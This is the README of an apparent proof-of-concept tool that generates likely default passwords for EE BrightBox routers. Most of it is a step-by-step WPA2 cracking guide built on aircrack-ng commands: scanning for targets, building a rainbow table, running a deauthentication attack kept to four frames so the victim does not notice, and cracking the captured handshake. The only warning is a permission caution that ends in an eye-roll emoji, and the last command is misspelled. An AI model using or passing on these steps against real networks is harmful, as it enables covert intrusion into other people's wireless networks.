# ee-brightbox
This program creates possible default passwords for ee-brightbox routers. This is just a proof of concept program and uses a small dictionary because of this.

Once this program has generated possible brightbox passwords, they could be hashed and stored in a rainbowtable to make cracking captured WPA2 handshakes faster.

1. Find the ESSID (name) of the target wireless network by using `airodump-ng wlan0`
2. Create a .txt file with just the ESSID of the target network in it. For this example, I will call this file `essid.txt`
3. Start to create your rainbowtable - the one in this example will be called ee_rainbowtable. The command is `airolib-ng ee_rainbowtable --import essid essid.txt`
4. Import the possible passwords generated using this python program to your new rainbowtable. For this example, I will call this .txt file of possible passwords `ee_password.txt` The command is `airolib-ng ee_rainbowtable --import passwd ee_password.txt`
5. Compute the hashes - this will take a very long time but will speed up future password cracking. The command is `airolib-ng ee_rainbowtable --batch`
6. Clean up the rainbowtable before use with this command `airolib-ng ee_rainbowtable --clean all`
7. You will need to capture a handshake for the target wireless network if you do not already have one. This can be done by using a deauthenication attack. In order to launch this attack, you will need to know the MAC address of a machine using the wireless network. The BSSID (MAC address of the WAP) can be found using the earlier command of `airodump-ng wlan0`
8. Use the BSSID to probe the network further. For this example, I will use the BSSID of `00:11:22:33:44:55` The command is `airodump-ng --bssid 00:11:22:33:44:55 wlan0`
9. If there are hosts connected to the target network, their MAC addresses will be visible in the STATION column. For the rest of this example, I will use the MAC address of `66:77:88:99:00:11` for the client machine connected to the network which I will deauthenicate to steal the four-way handshake frames
10. Start capturing traffic on the target network and write it to a .cap file. I will use the name `handshake_1` for this example. The channel number will need to be the same as the channel the target network is using. Now use this command `airodump-ng --bssid 00:11:22:33:44:55 --channel 3 --write handshake_1 wlan0`
11. As the traffic is being captured and written to the .cap file, launch the deauthentication attack using only 4 frames so the user of the victim machine does not realise the attack has taken place. Use the target machine's MAC address with the -c flag and the WAP's MAC with the -a flag. The command is `aireplay-ng --deauth 4 -a 00:11:22:33:44:55 -c 66:77:88:99:00:11 wlan0`
12. If the attack is successful, you will see WPA handshake: 00:11:22:33:44:55 pop up at the top of the terminal where the capturing of frames is taking place. The capturing and saving of the traffic can now be stopped. When you look in the handshake_1.cap file you should be able to see the four-way handshake frames. Search for EAPOL packets to find them. You should find Message 1 of 4 through to Message 4 of 4 If this is the case, this .cap file can now be used with the rainbowtable of hashed possible passwords to crack the WPA2 password. The command is `airocrack-ng -r ee_rainbowtable handshake_1.cap`

>[!CAUTION]
> The above attacks should only ever be carried out against wireless networks you own or have permission to hack 🙄

Copyright (C) 2020  puzz00

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, version 3.

    This program is distributed in the hope that it will be useful
    and not utilised for evil purposes
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. It could, indeed,
    be a right load of rubbish!
    See the GNU General Public License for more details.
